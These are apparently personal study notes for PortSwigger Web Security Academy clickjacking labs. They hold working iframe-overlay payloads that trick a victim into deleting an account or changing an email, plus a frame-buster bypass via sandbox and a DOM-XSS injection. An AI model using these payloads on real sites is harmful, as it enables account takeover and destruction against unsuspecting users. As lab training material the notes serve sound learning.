# Clickjacking Notes

## Methodology

Based on the HTML from the first lab you can create an iframe that displays over a users account page

## Labs walkthrough

### Basic clickjacking with CSRF token protection

- In the exploit server craft a payload like:

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

- we need to change our lab id, setting our height and width variables to fit correctly, recommended is to start with 700px and 500px
- then we need to adjust the top and side values so that the "test me" decoy action aligh with "delecte accounts" button, suggested start with 300px and 60px
- set opacity to .01
- click store and view exploit to see if the iframe does place correctly, if not adjust the top and side values
- once correct change "test me" to "click me" and deliver to victim

### Clickjacking with form input data prefilled from a URL parameter

- this attack will change a users email, code crafted for it:

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

- follow same steps as above, adjust height and width
- adjust top and side value to cover the update email button
- set opacity to .001
- store and test, if works change "test me" to "click me"
- deliver to victim

### Clickjacking with a frame buster script

the frame buster attempts to stop the site from being put into an iframe, the usage of `sandbox="allow-forms"` disables the frame buster script
- we are going to attempt to change email like above with this code:

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

- follow same steps as above, adjust height and width
- adjust top and side value to cover the update email button
- set opacity to .001
- store and test, if works change "test me" to "click me"
- deliver to victim

### Exploiting clickjacking vulnerability to trigger DOM-based XSS

Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function

code:

```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

- follow same steps as above, adjust height and width
- adjust top and side value to cover the "submit feedback" page button
- set opacity to .001
- store and test, if works change "test me" to "click me"
- deliver to victim

### Multistep clickjacking

To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions

code:

```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

- follow same steps as above, adjust height and width
- adjust top and side value to cover the "delete account" button with the "test me first" attribute, and the "test me next" on the confirmation button
- set opacity to .001
- store and test, if works change "test me" to "click me"
- deliver to victim

